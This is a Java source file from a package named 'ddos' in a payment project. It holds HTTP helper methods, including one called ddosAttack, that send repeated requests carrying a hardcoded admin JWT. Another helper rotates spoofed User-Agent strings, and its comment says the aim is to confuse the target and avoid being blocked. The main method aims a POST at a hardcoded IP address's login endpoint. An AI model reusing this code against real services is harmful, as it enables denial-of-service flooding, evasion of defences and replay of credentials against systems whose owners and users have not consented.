package com.fzipp.pay.common.ddos;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Random;

/**
 * @program pay
 * @description
 * @Author FFang
 * @Create 2022-06-07 04:37
 */
public class HttpURLConnectionHelper {


    public static int ddosAttack(String api, String requestMethod) {
        try {
            URL url = new URL(api);
            //得到连接对象
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            //设置请求类型
            con.setRequestMethod(requestMethod);
            //设置请求需要返回的数据类型和字符集类型
            con.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            //允许写出
            con.setDoOutput(true);
            //允许读入
            con.setDoInput(true);
            //不使用缓存
            con.setUseCaches(false);
            // 设置超时时间
            con.setConnectTimeout(1000 * 300);
            // 连接
            con.connect();
            // POST请求伪装参数
            if ("POST".equalsIgnoreCase(requestMethod)) {
                //借助BufferedOutputStream提高速度
                OutputStream outputStream = new BufferedOutputStream(con.getOutputStream());
                String json = "{\"key\":\"token\",\"value\":\"eyJ0eXBlIjoiSldUIiwiYWxnIjoiSFMyNTYiLCJ0eXAiOiJKV1QifQ.eyJpZCI6ImFkbWluIiwicHdkIjoiMTIzNDU2MTYzODkzOTk0OTU3MiIsImV4cCI6MTYzODk0MTc0OX0.Jafb-dyWgV950gwt8K-b0BT8FXOG1lp421CwLOwSJvM\",\"id\":\"8f9d137e-8994-4289-be99-185f30ab8c48\"}";
                byte[] body = json.getBytes(StandardCharsets.UTF_8);
                outputStream.write(body, 0, body.length);
                //刷新数据到流中
                outputStream.flush();
                //关闭流
                outputStream.close();
            }
            // 断开连接
            con.disconnect();
            //得到响应码
            return con.getResponseCode();
        } catch (IOException e) {
            System.out.println("--------------------------------like a error !--------------------------------->  ");
        }
        return -1;
    }

    public static String sendRequest(String urlParam, String requestType) {

        HttpURLConnection con;
        BufferedReader buffer;
        StringBuffer resultBuffer;

        try {
            URL url = new URL(urlParam);
            //得到连接对象
            con = (HttpURLConnection) url.openConnection();
            //设置请求类型
            con.setRequestMethod(requestType);
            //设置请求需要返回的数据类型和字符集类型
            con.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            //允许写出
            con.setDoOutput(true);
            //允许读入
            con.setDoInput(true);
            //不使用缓存
            con.setUseCaches(false);
            // POST请求伪装参数
            if ("POST".equalsIgnoreCase(requestType)) {
                //借助BufferedOutputStream提高速度
                OutputStream outputStream = new BufferedOutputStream(con.getOutputStream());
                String json = "{\"key\":\"token\",\"value\":\"eyJ0eXBlIjoiSldUIiwiYWxnIjoiSFMyNTYiLCJ0eXAiOiJKV1QifQ.eyJpZCI6ImFkbWluIiwicHdkIjoiMTIzNDU2MTYzODkzOTk0OTU3MiIsImV4cCI6MTYzODk0MTc0OX0.Jafb-dyWgV950gwt8K-b0BT8FXOG1lp421CwLOwSJvM\",\"id\":\"8f9d137e-8994-4289-be99-185f30ab8c48\"}";
                byte[] body = json.getBytes(StandardCharsets.UTF_8);
                outputStream.write(body, 0, body.length);
                //刷新数据到流中
                outputStream.flush();
                //关闭流
                outputStream.close();
            }
            //得到响应码
            int responseCode = con.getResponseCode();
            //返回数据处理
            if (responseCode == HttpURLConnection.HTTP_OK) {
                //得到响应流
                InputStream inputStream = con.getInputStream();
                //将响应流转换成字符串
                resultBuffer = new StringBuffer();
                String line;
                buffer = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));
                while ((line = buffer.readLine()) != null) {
                    resultBuffer.append(line);
                }
                return resultBuffer.toString();
            }
            // 断开连接
            con.disconnect();
            return String.valueOf(responseCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    public static int sendAll(String URL, String requestType) {
        try {
            URL url = new URL(URL);
            URLConnection conn = url.openConnection();
            HttpURLConnection con = (HttpURLConnection) conn;
            if ("POST".equalsIgnoreCase(requestType)) {
                con.setRequestMethod(requestType);
                con.setRequestProperty("Content-Type", "application/json;charset=utf-8");
                con.setDoOutput(true);
                OutputStream outputStream = new BufferedOutputStream(con.getOutputStream());
                String json = "{\"id\":\"8f9d137e-8994-4289-be99-185f30ab8c48\"}";
                byte[] body = json.getBytes(StandardCharsets.UTF_8);
                outputStream.write(body, 0, body.length);
                outputStream.flush();
                outputStream.close();
                con.connect();
                return con.getResponseCode();
            }
            BufferedInputStream bis = new BufferedInputStream(
                    conn.getInputStream());
            if (bis.read() != -1)
                bis.close();
            con.connect();
            return con.getResponseCode();
        } catch (Exception ignored) {
        }
        return 0;
    }

    public static void sendAll(String URL) {
        try {
            URL url = new URL(URL);
            URLConnection conn = url.openConnection();
            BufferedInputStream bis = new BufferedInputStream(
                    conn.getInputStream());
            if (bis.read() != -1)
                bis.close();
        } catch (Exception e) {
            System.out.println("--------------------------------like a error !--------------------------------->  ");
        }
    }





    private static ArrayList<String> userAgentsList;

    /**
     * 用User-Agent列表来混淆对方，这样从一定程度上可以防止被封
     *
     * @param URL
     */
    public static void sendGet(String URL) {
        try {
            URL url = new URL(URL);
            URLConnection connection = url.openConnection();
            HttpURLConnection httpURLConnection = (HttpURLConnection) connection;
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setRequestProperty("Connection", "keep-alive");
            httpURLConnection.setRequestProperty("Cache-Control", "max-age=0");
            httpURLConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
            httpURLConnection.setRequestProperty("Accept-Charset", "zh-CN,zh;q=0.9");
            httpURLConnection.setRequestProperty("Content-Type", "application/text");
            httpURLConnection.setRequestProperty("User-Agent", selectUserAgent());
            httpURLConnection.connect();
            int code = httpURLConnection.getResponseCode();
            if (httpURLConnection.getResponseCode() >= 300) {
                throw new Exception("Request is not success, Response code is " + code);
            } else {
                System.out.println("Request is success, Response code is " + code);
            }
        } catch (Exception e) {
        }
    }
    private static String selectUserAgent() {
        Random random = new Random();
        int i = random.nextInt(userAgentsList.size());
        return userAgentsList.get(i);
    }
    private static void InsertUserAgent() {
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95");
        userAgentsList.add("Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50");
        userAgentsList.add(
                "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10");
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7");
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71");
        userAgentsList.add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko)");
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101");
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71");
        userAgentsList
                .add("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)");
        userAgentsList.add(
                "Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");

        userAgentsList.add(
                "Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10");
        userAgentsList.add(
                "Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0");
        userAgentsList
                .add("Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)");
        userAgentsList.add(
                "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5");
        userAgentsList.add("AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
    }


    public static void main(String[] args) {

//        String url = "http://119.23.64.180/payService/captcha/gain";
//        System.out.println(sendRequest(url, "GET"));
        String url2 = "http://119.23.64.180/payService/account/login.action";
        System.out.println(sendRequest(url2, "POST"));

    }
}

